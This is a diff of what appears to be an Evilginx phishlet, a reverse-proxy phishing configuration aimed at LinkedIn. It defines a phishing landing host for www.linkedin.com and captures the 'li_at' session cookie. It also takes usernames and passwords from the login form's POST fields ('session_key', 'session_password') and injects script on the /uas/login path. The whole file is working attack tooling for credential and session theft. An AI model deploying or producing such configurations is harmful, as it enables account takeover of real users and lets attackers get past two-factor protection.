@@ -1,27 +1,11 @@
-author: '@an0nud4y'
+author: '@mrgretzky'
 min_ver: '2.3.0'
 proxy_hosts:
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'linkedin.com', session: true, auto_filter: true, is_landing: true}
-#  - {phish_sub: 'platform', orig_sub: 'platform', domain: 'linkedin.com', session: false, auto_filter: true, is_landing: false}
-#  - {phish_sub: 'static-exp1', orig_sub: 'static-exp1', domain: 'licdn.com', session: false, auto_filter: true, is_landing: false}
-
-sub_filters:
-  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-  - {triggers_on: 'www.linkedin.com', orig_sub: 'www', domain: 'linkedin.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-#  - {triggers_on: 'www.linkedin.com', orig_sub: 'platform', domain: 'linkedin.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-#  - {triggers_on: 'www.linkedin.com', orig_sub: 'platform', domain: 'linkedin.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-#  - {triggers_on: 'www.linkedin.com', orig_sub: 'platform', domain: 'linkedin.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-#  - {triggers_on: 'www.linkedin.com', orig_sub: 'static-exp1', domain: 'licdn.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-#  - {triggers_on: 'www.linkedin.com', orig_sub: 'static-exp1', domain: 'licdn.com', search: 'https%3A%2F%2{hostname}/', replace: 'https%3A%2F%2{hostname}/', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-#  - {triggers_on: 'www.linkedin.com', orig_sub: 'static-exp1', domain: 'licdn.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
-
-
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'linkedin.com', session: true, is_landing: true}
+sub_filters: []
 auth_tokens:
   - domain: '.www.linkedin.com'
-    keys: ['li_at', 'bscookie', '.*,regexp']
-  - domain: '.linkedin.com'
-    keys: ['bcookie', 'sdsc', '.*,regexp']
+    keys: ['li_at']
 credentials:
   username:
     key: 'session_key'
@@ -31,11 +15,9 @@ credentials:
     key: 'session_password'
     search: '(.*)'
     type: 'post'
-
 login:
   domain: 'www.linkedin.com'
   path: '/uas/login'
-
 js_inject:
   - trigger_domains: ["www.linkedin.com"]
     trigger_paths: ["/uas/login"]
